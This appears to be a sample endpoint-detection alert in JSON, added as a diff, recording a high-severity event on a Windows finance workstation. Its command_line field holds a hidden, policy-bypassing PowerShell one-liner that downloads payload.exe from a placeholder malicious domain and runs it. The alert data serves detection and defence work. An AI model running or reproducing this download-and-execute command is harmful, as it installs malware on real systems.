@@ -1,0 +1,17 @@
+{
+  "alert_id": "EDR-99827-X",
+  "timestamp": "2026-04-10T09:14:00Z",
+  "endpoint": {
+    "hostname": "DESKTOP-FINANCE-04",
+    "ip_address": "192.168.1.50",
+    "os": "Windows 11"
+  },
+  "event": {
+    "type": "Process Execution",
+    "severity": "High",
+    "process_name": "powershell.exe",
+    "parent_process": "cmd.exe",
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://malicious-domain.com/payload.exe -OutFile C:\\Temp\\payload.exe; Start-Process C:\\Temp\\payload.exe\"",
+    "user": "DOMAIN\\finance_user"
+  }
+}
